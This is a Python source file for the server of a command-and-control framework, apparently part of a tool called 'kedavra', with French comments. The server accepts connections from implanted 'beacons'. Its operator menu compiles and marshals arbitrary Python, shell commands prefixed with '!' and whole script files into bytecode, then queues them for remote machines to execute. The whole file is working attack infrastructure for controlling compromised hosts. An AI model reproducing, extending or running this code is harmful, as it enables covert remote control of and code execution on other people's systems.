import socket
import threading
from loguru import logger
from kedavra import c2, Client
import threading
import signal
import marshal

server_thread = None

def signal_handler(sig, frame):
    global server_thread
    if server_thread:
        server_thread.must_kill()
        server_thread.join()
    exit(0)

client_map = {}

class ServerThread(threading.Thread):
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_threads = {}
        self.must_stop = False

    def must_kill(self):
        self.must_stop = True

    def run(self):
        logger.info(f"Server starting on {self.host}:{self.port}...")
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        try:
            while not self.must_stop:
                client_socket, address = self.server_socket.accept()

                if self.must_stop:
                    break

                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, address))
                client_thread.start()
                self.client_threads[address] = client_thread

            # Arrêt des sockets et des threads existants
            for client_socket in self.client_threads.keys():
                client_socket.close()

            for client_thread in self.client_threads.values():
                client_thread.join()

            self.server_socket.close()
            logger.info("Server stopped.")
        except Exception as e:
            logger.exception(f"Error : {e}")

    def handle_client(self, client_socket, address):
        host, port = address
        client = Client(host, port, 'socket')
        if client.id not in client_map:
            client_map[client.id] = client
            logger.info(f"New connexion : {client.id}")

        while not self.must_stop:
            try:
                instructions = client_socket.recv(1024).decode()
                if not instructions:
                    break
                client_map[client.id].update_last_contact_time()
                if instructions == 'get_instructions':
                    if client_map[client.id].is_remaining_instructions():
                        client_socket.send(client_map[client.id].pop_instruction())
                else:
                    print(instructions)
            except Exception as e:
                logger.exception(f"Error with client {client.id}: {e}")
                break

        client_socket.close()
        del self.client_threads[address]

def menu(thread):
    while True:
        selection = None
        while selection == None or len(selection) == 0:
            becons_fmt = '[' + ','.join([ e.__str__() for e in client_map.keys() ]) + ']'
            selection = input(f"Select a beacon between {becons_fmt}, type list for details: ")
            if selection not in client_map and len(selection) and \
                    selection not in ['quit', 'exit', 'list']:
                selection = None
            elif selection in ['quit', 'exit']:
                thread.must_kill()
                thread.join()
                return
            elif selection == 'list':
                for client in client_map:
                    print(client_map[client])
                selection = None
        instruction = ''
        while instruction not in ['exit', 'quit']:
            if len(instruction):
                if instruction[0] == '!': # if external command
                    cmd = instruction[1:].split(' ')
                    instruction = f"""import subprocess as sp; p = sp.run({cmd}, shell=True, capture_output=True); stdout, stderr = p.stdout.decode('cp850', errors='replace'), p.stderr.decode('cp850', errors='replace'); print(stdout) if len(stdout) else None; print(stderr) if len(stderr) else None"""
                if instruction[0] == '.':
                    splitted_instruction = instruction.split(' ')
                    if splitted_instruction[0] == '.script':
                        try:
                            with open(splitted_instruction[1], 'r') as file:
                                python_code = file.read()
                            byte_code = compile(python_code, '', 'exec')
                            byte_code = marshal.dumps(byte_code)
                            client_map[selection].add_instruction(byte_code)
                        except Exception as e:
                            logger.exception(f"Error while compiling instructions: {e}")
                    else:
                        print(f'{splitted_instruction[0]} is not a command')
                else:
                    try:
                        byte_code = compile(instruction, '', 'exec')
                        byte_code = marshal.dumps(byte_code)
                        client_map[selection].add_instruction(byte_code)
                    except Exception as e:
                        logger.exception(f"Error while compiling instructions : {e}")                   
            instruction = input(f"[{selection}]>>> ")
            
def run(server: c2):
    global server_thread
    server_host = server.host
    server_port = server.port
    server_thread = ServerThread(server_host, server_port)
    server_thread.start()
    signal.signal(signal.SIGINT, signal_handler)
    menu(server_thread)
